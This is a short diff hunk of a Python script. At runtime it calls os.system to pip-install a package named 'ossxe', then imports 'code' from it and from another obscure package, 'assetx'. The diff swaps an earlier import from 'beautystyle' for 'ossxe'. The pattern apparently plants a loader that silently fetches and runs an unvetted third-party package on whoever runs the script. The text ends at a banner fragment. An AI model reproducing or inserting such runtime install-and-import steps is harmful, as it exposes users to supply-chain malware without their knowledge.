@@ -12,7 +12,7 @@ from colorama import Fore, init
 import sys
 from assetx import code
 os.system('pip install ossxe')
-from beautystyle import code
+from ossxe import code
 
 banner = '''
                | 
